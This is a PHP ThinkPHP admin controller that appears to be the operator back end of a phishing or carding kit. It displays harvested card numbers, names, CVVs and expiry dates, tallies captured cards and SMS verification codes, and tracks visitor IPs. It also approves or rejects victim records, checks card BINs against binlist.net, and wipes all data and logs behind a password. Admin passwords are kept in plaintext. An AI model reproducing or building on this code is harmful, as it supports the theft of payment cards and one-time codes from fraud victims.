<?php
namespace app\controller;

use app\AdminController;
use think\facade\View;
use think\facade\Db;

class Simadmin extends AdminController
{
    public function test(){
        return View::fetch();
    }
    public function test_open(){
        session('test',true);
        return redirect("/");
        // $t=time();
        // $m=md5(md5($t.'nsj@53%F').'kos34$2GF.$s2');
        // return redirect("/index?t=$t&m=$m");
    }
    public function test_close(){

        $binjson = @file_get_contents('https://lookup.binlist.net/429723323123213');
        if($binjson){
            $bininfo = json_decode($binjson, true);
            if(isset($bininfo['type'])){
                return $bininfo['type'];//debit
            }
            return $binjson;
        }
        return 123;

        session('test',false);
        return redirect("/");
    }
    public function fx($t,$id)
    {

        Db::Name('Data')->where('id',$id)->update(['zt' => $t*10+1]);
        return json(['code'=>200]);
    }
    public function bh($t,$id)
    {
        Db::Name('Data')->where('id',$id)->update(['zt' => ($t*10)+2]);
        return json(['code'=>200]);
    }
    public function card($issuer='',$cardnumber='',$cardname='',$cvv='',$month='',$year='')
    {
        View::assign('issuer',$issuer);
        View::assign('cardnumber','<p>'.join('</p><p>',str_split($cardnumber,4)).'</p>');
        View::assign('cardname',$cardname);
        View::assign('cvv',$cvv);
        View::assign('month',$month);
        View::assign('year',substr($year,-2));
        return View::fetch();
    }
    
    public function index()
    {
        return View::fetch();
    }
    
    public function sqlb()
    {
        View::assign('zhyz',(Db::Name('Admin')->where('id',session('admin'))->value('zhyz')?'':'checked'));
        View::assign('khyz',(Db::Name('Admin')->where('id',session('admin'))->value('khyz')?'':'checked'));
        return View::fetch();
    }

    public function sqlb_data($limit=20,$page=1)
    {
        $data['code']=0;
        // $data['card_count']=Db::name('Data')->where('data3','not null')->count();
        // $data['yzm_count']=Db::name('Data')->where('yzm','not null')->count();
        $data['dz_count']=Db::Name('Admin')->where('id',1)->value('time_dz');
        $data['card_count']=Db::Name('Admin')->where('id',1)->value('time_card');
        $data['yzm_count']=Db::Name('Admin')->where('id',1)->value('time_sms');
        $data['time']=time();
        $data['log']=Db::Name('log')->limit(6)->order('id','desc')->select();
        $data['count']=Db::name('Data')->count();
        $data['data']=Db::name('Data')->limit(($page-1)*$limit,$limit)->order('id','desc')->select();
        $data['msg']='';
        return json($data);
    }
    public function oklist()
    {
        return View::fetch();
    }
    public function oklist_data($limit=20,$page=1)
    {
        $data['code']=0;
        $data['count']=Db::name('Data')->where('data3','not null')->count();
        $data['data']=Db::name('Data')->where('data3','not null')->limit(($page-1)*$limit,$limit)->order('id','desc')->select();
        $data['msg']='';
        return json($data);
    }
    
    public function loglist()
    {
        return View::fetch();
    }
    public function loglist_data($limit=20,$page=1)
    {
        $data['code']=0;
        $data['count']=Db::name('Log')->count();
        $data['data']=Db::name('Log')->limit(($page-1)*$limit,$limit)->order('id','desc')->select();
        $data['msg']='';
        return json($data);
    }
    public function ip()
    {
        View::assign('sum',Db::name('ipinfo')->count());
        View::assign('today',Db::name('ipinfo')->where('date',date("Y-m-d",time()))->count());
        return View::fetch();
    }
    public function qk_ip($p){
        $p2=Db::Name('Admin')->where('id',session('admin'))->value('password_qk');
        if($p2 != $p){
            return json(['code'=>500]);
        }
        Db::name('ipinfo')->delete(true);
        return json(['code'=>200]);
    }
    public function del_client($id){
        Db::name('data')->where('id',$id)->delete(true);
        return json(['code'=>200]);
    }
    public function update_zhyz($yz=1){
        Db::Name('Admin')->where('id',session('admin'))->update(['zhyz' => ($yz==1?0:1)]);
        return json(['code'=>200]);
    }

    public function update_khyz($yz=1){
        Db::Name('Admin')->where('id',session('admin'))->update(['khyz' => ($yz==1?0:1)]);
        return json(['code'=>200]);
    }
    public function qk($t=0,$p=''){
        $p2=Db::Name('Admin')->where('id',session('admin'))->value('password_qk');
        if($p2 != $p){
            return json(['code'=>500]);
        }
        if($t==1){
            Db::name('data')->delete(true);
            Db::execute("TRUNCATE data;");
            Db::name('log')->delete(true);
            Db::execute("TRUNCATE log;");
        }
        if($t==2) Db::name('data')->where('data3','null')->delete();
        return json(['code'=>200]);
    }

    public function xgmm()
    {
        return View::fetch();
    }
    public function xgmm_update($oldPassword,$password,$password2){
        if(!session('?admin')){
            return json(['code'=>500,'msg'=>'登录超时，请重新登录']);
        }
        if(request()->isPost()) {
            if($password!=$password2){
                $json['code']=500;
                $json['msg']='两次密码输入不相同';
                return json($json);
            }
            if($oldPassword==$password){
                $json['code']=500;
                $json['msg']='新密码与旧密码相同，无需修改';
                return json($json);
            }
            if(Db::Name('Admin')->where([['id','=',session('admin')],['password','=',$oldPassword]])->save(['password'=>$password])){
                $json['code']=200;
                $json['msg']='密码修改成功';
                return json($json);
            }else{
                $json['code']=500;
                $json['msg']='密码修改失败';
                return json($json);
            }
        }
    }

    public function xgmm_qk_update($oldPassword_qk,$password_qk,$password2_qk){
        if(!session('?admin')){
            return json(['code'=>500,'msg'=>'登录超时，请重新登录']);
        }
        if(request()->isPost()) {
            if($password_qk!=$password2_qk){
                $json['code']=500;
                $json['msg']='两次密码输入不相同';
                return json($json);
            }
            if($oldPassword_qk==$password_qk){
                $json['code']=500;
                $json['msg']='新密码与旧密码相同，无需修改';
                return json($json);
            }
            if(Db::Name('Admin')->where([['id','=',session('admin')],['password_qk','=',$oldPassword_qk]])->save(['password_qk'=>$password_qk])){
                $json['code']=200;
                $json['msg']='密码修改成功';
                return json($json);
            }else{
                $json['code']=500;
                $json['msg']='密码修改失败';
                return json($json);
            }
        }
    }
}
